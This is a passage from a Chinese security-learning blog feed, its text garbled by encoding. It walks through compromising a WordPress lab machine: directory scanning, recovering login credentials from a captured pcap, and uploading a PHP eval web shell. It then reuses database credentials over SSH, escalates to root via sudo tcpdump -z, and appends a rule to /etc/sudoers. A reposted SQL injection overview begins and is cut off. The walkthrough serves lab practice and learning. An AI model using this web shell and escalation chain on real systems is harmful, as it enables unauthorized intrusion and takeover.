alt="WordPress"></p><p>ç„¶åè¿›è¡Œå¸¸è§„çš„ä¿¡æ¯æ”¶é›†ï¼Œä¸æ€¥ï¼Œå…ˆæ‰«ç›®å½•ï¼Œç›´æ¥å¼€ kali é‡Œçš„ <code>dirb</code> æ¥æ‰«ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.17.134/ -o result.txt</span><br></pre></td></tr></table></figure><p><code>-o result.txt</code> æ˜¯å°†ç»“æœç”Ÿæˆä¸€ä¸ª <code>result.txt</code> ä¿å­˜åœ¨å®¶ç›®å½•<code>~</code>é‡Œï¼Œ<code>result.txt</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">OUTPUT_FILE: result.txt</span><br><span class="line">START_TIME: Wed Dec  2 10:16:40 2020</span><br><span class="line">URL_BASE: http://192.168.17.134/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line">---- Scanning URL: http://192.168.17.134/ ----</span><br><span class="line">+ http://192.168.17.134/index.php (CODE:301|SIZE:0)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/ipdata/</span><br><span class="line">+ http://192.168.17.134/server-status (CODE:403|SIZE:302)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-content/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-includes/</span><br><span class="line">+ http://192.168.17.134/xmlrpc.php (CODE:405|SIZE:42)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/ipdata/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/ ----</span><br><span class="line">+ http://192.168.17.134/wp-admin/admin.php (CODE:302|SIZE:0)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/css/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/images/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/includes/</span><br><span class="line">+ http://192.168.17.134/wp-admin/index.php (CODE:302|SIZE:0)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/js/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/maint/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/network/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-admin/user/</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-content/ ----</span><br><span class="line">+ http://192.168.17.134/wp-content/index.php (CODE:200|SIZE:0)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-content/languages/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-content/plugins/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-content/themes/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-content/upgrade/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.17.134/wp-content/uploads/</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/css/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/js/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/maint/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.17.134/wp-admin/network/admin.php (CODE:302|SIZE:0)</span><br><span class="line">+ http://192.168.17.134/wp-admin/network/index.php (CODE:302|SIZE:0)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.17.134/wp-admin/user/admin.php (CODE:302|SIZE:0)</span><br><span class="line">+ http://192.168.17.134/wp-admin/user/index.php (CODE:302|SIZE:0)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-content/languages/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.17.134/wp-content/plugins/index.php (CODE:200|SIZE:0)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.17.134/wp-content/themes/index.php (CODE:200|SIZE:0)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-content/upgrade/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.17.134/wp-content/uploads/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Wed Dec  2 10:17:25 2020</span><br><span class="line">DOWNLOADED: 32284 - FOUND: 12</span><br></pre></td></tr></table></figure><p>é‡Œé¢æ³„éœ²äº†å¾ˆå¤šæ•æ„Ÿçš„ç›®å½•ï¼Œæ¯”å¦‚åå°ç™»å½•è·¯å¾„<code>wp-admin</code>ï¼Œæ–‡ä»¶ä¸Šä¼ è·¯å¾„<code>wp-content/uploads/</code>ä½†æ˜¯æœ€å¥‡æ€ªçš„æ˜¯è¿™ä¸€ä¸ª<code>http://192.168.17.134/ipdata/</code>ï¼Œè¿›æ¥ä¸‹è½½äº†ä¸€ä¸ªæ–‡ä»¶<code>analyze.cap</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202232211.png"></p><p>ç”¨<code>winhex</code>æ‰“å¼€å‘ç°ä¸€æ®µ <code>httpè¯·æ±‚å¤´</code> ï¼Œæ„Ÿè§‰æ˜¯ä¸ªæµé‡æ–‡ä»¶ï¼Œå†ç”¨<code>wireshark</code>æ‰“å¼€</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202232727.png" alt="winhex"></p><p>åˆ†ææµé‡ï¼Œç›´æ¥çœ‹<code>http</code>çš„æµé‡åŒ…ï¼Œå‘ç°æœ‰å¯¹<code>wp-login.php</code>é¡µé¢ä»¥<code>POST</code>æ¨¡å¼å‘å‡ºè¯·æ±‚çš„æµé‡åŒ…ï¼ŒæŸ¥çœ‹åŒ…çš„è¡¨å•ä¿¡æ¯å‘ç°èƒ½ç™»å½•æˆåŠŸçš„è´¦å·å¯†ç </p><p>è´¦å·ï¼š<code>webdeveloper</code></p><p>å¯†ç ï¼š<code>Te5eQg&amp;4sBS!Yr$)wf%(DcAd</code></p><blockquote><ol><li>ç™»å½•é¡µé¢çš„è´¦å·å¯†ç ä¸€èˆ¬æ˜¯å°†è´¦å·å¯†ç å­˜å…¥è¡¨å•é‡‡ç”¨ <code>POST</code> æ¨¡å¼æäº¤è¯·æ±‚ï¼Œæ‰€ä»¥é‡ç‚¹æ‰¾ <code>POST</code> çš„åŒ…</li><li>åˆ†ææµé‡å‘ç°åœ¨å‘é€ç™»å½•è¯·æ±‚è¿‡åï¼Œè¿”å›çš„çŠ¶æ€ç æ˜¯<code>200 OK</code>ï¼Œç”±æ­¤åˆ¤æ–­è¿™ä¸ªè´¦å·å¯†ç æ˜¯æ­£ç¡®çš„è´¦å·å¯†ç </li></ol></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202233557.png"></p><p>ç„¶åè®¿é—®åå°ç™»å½•çš„ url ï¼Œç™»å½•è¿›å…¥åå°</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202233726.png" alt="åå°"></p><p>è¿›å…¥åå°è‡ªç„¶æ˜¯å¯»æ‰¾æ–‡ä»¶ä¸Šä¼ çš„æ¥å£ï¼Œç„¶åä¼ ğŸ getshell ï¼Œå‘ç°æœ‰å¾ˆå¤šå¤„èƒ½å¤Ÿæ”»å‡»çš„ç‚¹</p><ul><li>ç›´æ¥ä¸Šä¼ æ’ä»¶ï¼Œç›´æ¥ä¼  php çš„ğŸï¼Œè·¯å¾„<code>/wp-content/uploads/year/month/xx.php</code>ï¼Œæ¯”å¦‚<code>/wp-content/uploads/2020/12/horse.php</code></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202234216.png"></p><ul><li>ç¼–è¾‘å·²å®‰è£…æ’ä»¶çš„ php æ–‡ä»¶ï¼Œåœ¨é‡Œé¢æ·»åŠ ä¸€å¥è¯æœ¨é©¬ï¼Œå†å¯ç”¨æ’ä»¶ä¹Ÿå¯ä»¥è¾¾åˆ°æ”»å‡»ç›®çš„</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203005031.png"></p><ul><li>ç¼–è¾‘ä¸»é¢˜é‡Œçš„æ¨¡æ¿é¡µé¢ï¼ˆä¹Ÿæ˜¯ php é¡µé¢ï¼‰ï¼Œåœ¨é‡Œé¢æ·»åŠ ä¸€å¥è¯æœ¨é©¬ï¼Œæ¯”å¦‚åœ¨<code>404.php</code>é¡µé¢æ–‡ä»¶ä¸­æ·»åŠ æœ¨é©¬ï¼Œè®¿é—®åˆ° 404 é¡µé¢å°±èƒ½è¾¾åˆ°æ”»å‡»ç›®çš„</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203005546.png"></p><ul><li>åª’ä½“åº“é‡Œä¹Ÿæœ‰æ–‡ä»¶ä¸Šä¼ çš„æ¥å£ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥ä¸Šä¼  php æ–‡ä»¶ï¼Œå¯èƒ½éœ€è¦é…åˆä¸Šä¼ <code>.user.ini</code>æˆ–è€…<code>.htaccess</code>æ–‡ä»¶å’Œå›¾ç‰‡ğŸæ¥ç»•è¿‡å®‰å…¨æ£€æµ‹æ¥è¾¾åˆ°æ”»å‡»ç›®çš„</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203010346.png"></p><blockquote><p>ä¸‹é¢æ˜¯ç”¨ç¬¬ä¸€ç§æ–¹æ³•æ‰“çš„</p></blockquote><p><code>horse.php</code>æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œå†…å®¹ä¸º<code>&lt;?php @eval($_POST[&#39;ma&#39;]);phpinfo(); ?&gt;</code></p><blockquote><p><code>phpinfo()</code>å‡½æ•°æ‰§è¡ŒæˆåŠŸä¼šè¿”å›å½“å‰ php ç¯å¢ƒçš„å¾ˆå¤šä¿¡æ¯ï¼Œç”¨æ¥åˆ¤æ–­æœ¨é©¬æ˜¯å¦è¢«è§£ææˆ php æ–‡ä»¶æ‰§è¡Œ</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202234216.png"></p><p>ç„¶åä¼šæ˜¾ç¤ºæ— æ³•å®‰è£…åŒ…ï¼Œä½†æ˜¯æˆ‘ä»¬çš„ğŸè¿˜æ˜¯ä¸Šä¼ ä¸Šå»äº†çš„</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202234304.png"></p><p>è®¿é—®æˆ‘ä»¬çš„ğŸï¼Œ<code>http://192.168.17.134/wp-content/uploads/2020/12/horse.php</code>ï¼Œå‡ºç°<code>phpinfo</code>ï¼Œok</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202234432.png"></p><p>æ‹¿<code>èšå‰‘</code>è¿ï¼Œæƒ³ç›´æ¥æ‹¿åˆ° flag ï¼Œä½†æ˜¯æƒé™å¤ªä½äº†</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203010648.png"></p><p>ä½†æ˜¯å¯ä»¥çœ‹çœ‹æ•æ„Ÿæ–‡ä»¶ï¼Œ<code>config</code>ä¸€èˆ¬æ˜¯é…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥çœ‹çœ‹<code>wp-config.php</code>ï¼Œå‘ç°äº†<code>MySQL</code>æ•°æ®åº“çš„è´¦å·å¯†ç </p><p>è´¦å·ï¼š<code>webdeveloper</code></p><p>å¯†ç ï¼š<code>MasterOfTheUniverse</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203011027.png"></p><p>åˆ°è¿™æœ‰ç‚¹æ²¡æ€è·¯äº†ï¼Œæƒ³åˆ°é¶æœºå¼€æ”¾äº†<code>22</code>ç«¯å£ï¼Œå¯èƒ½è´¦å·å¯†ç è·Ÿè¿™ä¸ªä¼šæ˜¯ä¸€æ ·çš„ï¼Œå¼€ xshell å°è¯•è¿æ¥ï¼Œç»“æœæˆåŠŸäº†ï¼Œ<code>sudo -l</code>æŸ¥çœ‹å¯ä»¥ç”¨çš„ root å‘½ä»¤æœ‰ä¸€ä¸ª<code>tcpdump</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203011405.png"></p><p>ä½†æ˜¯å°è¯•æ‹¿ flag è¿˜æ˜¯ä¸å¤Ÿèµ„æ ¼ï¼Œéœ€è¦ç»§ç»­ææƒï¼Œåˆ°è¿™é‡Œå·²ç»ä¸ä¼šäº†ï¼Œå»çœ‹äº†ç™¾åº¦ï¼Œè¯´è¦ç”¨<code>tcpdump</code>ææƒ</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203011606.png"></p><p>åˆ›å»ºæ”»å‡»è„šæœ¬ï¼Œåå­—å«<code>exploit</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch /tmp/exploit</span><br></pre></td></tr></table></figure><p>å†™å…¥ <code>shellcode</code>ï¼ˆè¦æ‰§è¡Œçš„ä»£ç ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&#x27;cat /root/flag.txt&#x27;</span> &gt; <span class="regexp">/tmp/</span>exploit</span><br></pre></td></tr></table></figure><p>èµ‹äºˆå¯æ‰§è¡Œæƒé™</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /tmp/exploit</span><br><span class="line"><span class="comment">// +x å‚æ•°è¡¨ç¤ºç»™ exploit æ–‡ä»¶èµ‹äºˆå¯æ‰§è¡Œæƒé™</span></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/linux/linux-comm-chmod.html">Linux chmodå‘½ä»¤è¯¦è§£</a></p><p>åˆ©ç”¨<code>tcpdump</code>æ‰§è¡Œä»»æ„å‘½ä»¤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i eth0 -w /dev/<span class="literal">null</span> -W <span class="number">1</span> -G <span class="number">1</span> -z /tmp/exploit -Z root</span><br></pre></td></tr></table></figure><blockquote><p>ç”¨åˆ°çš„<code>tcpdump</code>å‘½ä»¤ï¼š<br> <code>-i eth0</code> ä»æŒ‡å®šç½‘å¡æ•è·æ•°æ®åŒ…<br> <code>-w /dev/null</code> å°†æ•è·åˆ°çš„æ•°æ®åŒ…è¾“å‡ºåˆ°ç©ºè®¾å¤‡ï¼ˆä¸è¾“å‡ºæ•°æ®åŒ…ç»“æœï¼‰<br> <code>-z [command]</code> è¿è¡ŒæŒ‡å®šçš„å‘½ä»¤<br> <code>-Z [user]</code> æŒ‡å®šç”¨æˆ·æ‰§è¡Œå‘½ä»¤<br> <code>-G [rotate_seconds]</code> æ¯rotate_secondsç§’ä¸€æ¬¡çš„é¢‘ç‡æ‰§è¡Œ<code>-w</code>æŒ‡å®šçš„è½¬å‚¨<br> <code>-W [num]</code> æŒ‡å®šæŠ“åŒ…æ•°é‡</p><blockquote><p><code>tcpdump</code>ææƒçš„åŸç†å°±æ˜¯åˆ©ç”¨<code>-z</code>å’Œ<code>-Z</code>ï¼Œ<code>-z</code>æ‰§è¡Œè„šæœ¬ï¼Œ<code>-Z</code>æŒ‡å®šä»¥ <code>root</code> ç”¨æˆ·æ‰§è¡Œè„šæœ¬ï¼Œä»è€Œææƒ</p><p>&#96;&#96;-W<code>1</code>-G<code>1ï¼Œè¡¨ç¤ºä¸€æ¬¡æŠ“ä¸€ä¸ªåŒ…ï¼Œç„¶åæŠŠè¿™ä¸ªåŒ…ä¸¢åˆ°é»‘æ´é‡Œé¢ï¼Œé»‘æ´æ˜¯</code>dev&#x2F;null&#96;</p><blockquote><p><code>tcpdump</code>æ˜¯ä»€ä¹ˆ</p><p>ç”¨ç®€å•çš„è¯æ¥å®šä¹‰ï¼Œå°±æ˜¯ï¼šdump the traffic on a  networkï¼Œæ ¹æ®ä½¿ç”¨è€…çš„å®šä¹‰å¯¹ç½‘ç»œä¸Šçš„æ•°æ®åŒ…è¿›è¡Œæˆªè·çš„åŒ…åˆ†æå·¥å…·ã€‚ å¯ä»¥å°†ç½‘ç»œä¸­ä¼ é€çš„æ•°æ®åŒ…çš„â€œå¤´â€å®Œå…¨æˆªè·ä¸‹æ¥æä¾›åˆ†æã€‚å®ƒæ”¯æŒé’ˆå¯¹ç½‘ç»œå±‚ã€åè®®ã€ä¸»æœºã€ç½‘ç»œæˆ–ç«¯å£çš„è¿‡æ»¤ï¼Œå¹¶æä¾›andã€orã€notç­‰é€»è¾‘è¯­å¥æ¥å¸®åŠ©ä½ å»æ‰æ— ç”¨çš„ä¿¡æ¯ã€‚</p></blockquote></blockquote></blockquote><p>æ‹¿åˆ° flag</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203015122.png" alt="flag"></p><p>å¦ä¸€ç§ææƒæ€è·¯ï¼Œæ—¢ç„¶å¯ä»¥å†™ shell äº†ï¼Œå¯ä»¥ç›´æ¥ç»™<code>webdeveloper</code>è¿™ä¸ªç”¨æˆ·æå‡åˆ°<code>root</code>æƒé™ï¼Œç›´æ¥å†™ shell åˆ°<code>sudo</code>çš„é…ç½®æ–‡ä»¶<code>/etc/sudoers</code>é‡Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&#x27;echo &quot;%webdeveloper ALL=(ALL:ALL) ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; <span class="regexp">/tmp/</span>exploit</span><br><span class="line">chmod +x /tmp/exploit</span><br><span class="line">sudo tcpdump -i eth0 -w /dev/<span class="literal">null</span> -W <span class="number">1</span> -G <span class="number">1</span> -z /tmp/exploit -Z root</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203020216.png" alt="flag too"></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥æ€»ç»“</title>
      <link href="/posts/61314/"/>
      <url>/posts/61314/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢<br>æœ¬æ–‡è½¬è‡ª<a href="https://xz.aliyun.com/t/2869">å…ˆçŸ¥ç¤¾åŒº-SQLæ³¨å…¥æ€»ç»“</a>ï¼Œæ–‡ç« åˆ†äº«æ¥è‡ªç¤¾å›¢å­¦é•¿</p></blockquote><h1 id="0x01-ä»€ä¹ˆæ˜¯SQLæ³¨å…¥"><a href="#0x01-ä»€ä¹ˆæ˜¯SQLæ³¨å…¥" class="headerlink" title="0x01 ä»€ä¹ˆæ˜¯SQLæ³¨å…¥"></a>0x01 ä»€ä¹ˆæ˜¯SQLæ³¨å…¥</h1><p>sql æ³¨å…¥å°±æ˜¯ä¸€ç§é€šè¿‡æ“ä½œè¾“å…¥æ¥ä¿®æ”¹åå°æ“ä½œè¯­å¥è¾¾åˆ°æ‰§è¡Œæ¶æ„ sql è¯­å¥æ¥è¿›è¡Œæ”»å‡»çš„æŠ€æœ¯ã€‚</p><h1 id="0x02-SQLæ³¨å…¥çš„åˆ†ç±»"><a href="#0x02-SQLæ³¨å…¥çš„åˆ†ç±»" class="headerlink" title="0x02 SQLæ³¨å…¥çš„åˆ†ç±»"></a>0x02 SQLæ³¨å…¥çš„åˆ†ç±»</h1><h2 id="æŒ‰å˜é‡ç±»å‹åˆ†"><a href="#æŒ‰å˜é‡ç±»å‹åˆ†" class="headerlink" title="æŒ‰å˜é‡ç±»å‹åˆ†"></a>æŒ‰å˜é‡ç±»å‹åˆ†</h2><ul><li>æ•°å­—å‹</li><li>å­—ç¬¦å‹</li></ul><h2 id="æŒ‰HTTPæäº¤æ–¹å¼åˆ†"><a href="#æŒ‰HTTPæäº¤æ–¹å¼åˆ†" class="headerlink" title="æŒ‰HTTPæäº¤æ–¹å¼åˆ†"></a>æŒ‰HTTPæäº¤æ–¹å¼åˆ†</h2><ul><li>GET æ³¨å…¥</li><li>POST æ³¨å…¥</li><li>Cookie æ³¨å…¥</li></ul><h2 id="æŒ‰æ³¨å…¥æ–¹å¼åˆ†"><a href="#æŒ‰æ³¨å…¥æ–¹å¼åˆ†" class="headerlink" title="æŒ‰æ³¨å…¥æ–¹å¼åˆ†"></a>æŒ‰æ³¨å…¥æ–¹å¼åˆ†</h2><ul><li>æŠ¥é”™æ³¨å…¥</li><li>ç›²æ³¨<ul><li>å¸ƒå°”ç›²æ³¨</li><li>æ—¶é—´ç›²æ³¨</li></ul></li><li>union æ³¨å…¥</li></ul><h2 id="ç¼–ç é—®é¢˜"><a href="#ç¼–ç é—®é¢˜" class="headerlink" title="ç¼–ç é—®é¢˜"></a>ç¼–ç é—®é¢˜</h2><ul><li>å®½å­—èŠ‚æ³¨å…¥</li></ul><h1 id="0x03è¯†åˆ«åå°æ•°æ®åº“"><a href="#0x03è¯†åˆ«åå°æ•°æ®åº“" class="headerlink" title="0x03è¯†åˆ«åå°æ•°æ®åº“"></a>0x03è¯†åˆ«åå°æ•°æ®åº“</h1><h2 id="æ ¹æ®æ“ä½œç³»ç»Ÿå¹³å°"><a href="#æ ¹æ®æ“ä½œç³»ç»Ÿå¹³å°" class="headerlink" title="æ ¹æ®æ“ä½œç³»ç»Ÿå¹³å°"></a>æ ¹æ®æ“ä½œç³»ç»Ÿå¹³å°</h2><p><strong>sql server</strong>ï¼šWindowsï¼ˆIIS)</p><p><strong>MySQL</strong>ï¼šApache</p><h2 id="æ ¹æ®webè¯­è¨€"><a href="#æ ¹æ®webè¯­è¨€" class="headerlink" title="æ ¹æ®webè¯­è¨€"></a>æ ¹æ®webè¯­è¨€</h2><p><strong>Microsoft SQL Server</strong>ï¼šASP å’Œ .Net</p><p><strong>MySQL</strong>ï¼šPHP</p><p><strong>Oracle&#x2F;MySQL</strong>ï¼šjava</p><p>(ä»¥ä¸‹æ˜¯å¯¹ mysql æ•°æ®åº“çš„æ€»ç»“ï¼Œå…¶ä»–ç±»å‹æ•°æ®åº“ä¼šä¸å®šæ—¶æ›´æ–°)</p><h1 id="0x04-MySQL-5-0ä»¥ä¸Šå’ŒMySQL-5-0ä»¥ä¸‹ç‰ˆæœ¬çš„åŒºåˆ«"><a href="#0x04-MySQL-5-0ä»¥ä¸Šå’ŒMySQL-5-0ä»¥ä¸‹ç‰ˆæœ¬çš„åŒºåˆ«" class="headerlink" title="0x04 MySQL 5.0ä»¥ä¸Šå’ŒMySQL 5.0ä»¥ä¸‹ç‰ˆæœ¬çš„åŒºåˆ«"></a>0x04 MySQL 5.0ä»¥ä¸Šå’ŒMySQL 5.0ä»¥ä¸‹ç‰ˆæœ¬çš„åŒºåˆ«</h1><p>MySQL 5.0ä»¥ä¸Šç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªå­˜å‚¨ç€æ•°æ®åº“ä¿¡æ¯çš„ä¿¡æ¯æ•°æ®åº“â€“<strong>INFORMATION_SCHEMA</strong> ï¼Œå…¶ä¸­ä¿å­˜ç€å…³äº MySQL æœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æ•°æ®åº“åï¼Œæ•°æ®åº“çš„è¡¨ï¼Œè¡¨æ çš„æ•°æ®ç±»å‹ä¸è®¿é—®æƒé™ç­‰ã€‚ è€Œ5.0ä»¥ä¸‹æ²¡æœ‰ã€‚</p><p><strong><code>information_schema</code></strong></p><p>ç³»ç»Ÿæ•°æ®åº“ï¼Œè®°å½•å½“å‰æ•°æ®åº“çš„æ•°æ®åº“ï¼Œè¡¨ï¼Œåˆ—ï¼Œç”¨æˆ·æƒé™ç­‰ä¿¡æ¯</p><p><strong><code>SCHEMATA</code></strong></p><p>å‚¨å­˜ mysql æ‰€æœ‰æ•°æ®åº“çš„åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ•°æ®åº“åï¼Œç¼–ç ç±»å‹è·¯å¾„ç­‰</p><p><strong><code>TABLES</code></strong></p><p>å‚¨å­˜ mysql 